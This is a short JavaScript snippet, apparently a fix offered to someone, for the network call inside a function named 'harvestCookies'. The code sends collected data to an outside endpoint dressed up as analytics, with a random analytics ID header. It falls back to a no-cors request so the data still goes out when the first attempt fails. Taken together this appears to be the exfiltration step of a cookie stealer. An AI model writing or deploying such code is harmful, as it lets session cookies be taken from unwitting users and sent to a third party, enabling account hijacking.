// In your harvestCookies function, replace the fetch with:

fetch(ANALYTICS_ENDPOINT, {
  method: 'POST',
  mode: 'cors', // Try cors first
  headers: {
    'Content-Type': 'application/json', // THIS IS CRITICAL
    'X-Analytics-ID': `ae_${Math.random().toString(36).substring(2, 10)}`
  },
  body: JSON.stringify(analyticsData)
})
.then(response => {
  console.log('📥 Response status:', response.status);
  return response.json().catch(() => ({}));
})
.then(data => {
  console.log('✅ Server response:', data);
})
.catch(err => {
  console.error('❌ CORS mode failed:', err);
  
  // Fallback to no-cors
  return fetch(ANALYTICS_ENDPOINT, {
    method: 'POST',
    mode: 'no-cors',
    headers: {
      'Content-Type': 'application/json', // Still set it even in no-cors
    },
    body: JSON.stringify(analyticsData)
  })
  .then(() => {
    console.log('✅ No-cors fallback succeeded');
  })
  .catch(err2 => {
    console.error('❌ Both attempts failed:', err2);
  });
});